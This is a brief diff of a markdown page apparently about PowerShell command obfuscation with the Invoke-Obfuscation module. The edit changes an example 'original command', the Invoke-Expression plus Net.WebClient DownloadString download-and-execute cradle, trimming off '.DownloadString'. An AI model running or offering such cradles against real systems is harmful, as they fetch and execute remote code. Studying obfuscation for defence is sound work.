@@ -4,7 +4,7 @@ You can pick up some of the methods of PowerShell command and script obfuscation
 
 #### Original command (before obfuscation)
 ```powershell
-Invoke-Expression (New-Object Net.WebClient).DownloadString
+Invoke-Expression (New-Object Net.WebClient)
 ```
 #### Invoke-Obfuscation module premise
 ```powershell
